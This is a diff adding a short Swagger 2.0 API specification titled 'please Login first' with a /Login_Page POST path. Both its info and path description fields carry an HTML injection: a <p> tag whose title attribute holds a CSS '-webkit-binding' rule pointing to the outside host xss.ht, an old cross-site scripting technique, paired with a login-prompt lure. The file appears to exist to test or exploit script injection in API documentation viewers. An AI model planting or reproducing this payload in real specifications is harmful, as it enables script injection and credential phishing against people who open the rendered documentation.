@@ -1,0 +1,13 @@
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: please Login first 
+  description: |
+  <p title="*{-webkit-binding: url(//xss.ht)}">
+
+paths:
+  /Login_Page:
+    post:
+      summary: please Login first
+      description: |
+  <p title="*{-webkit-binding: url(//xss.ht)}">
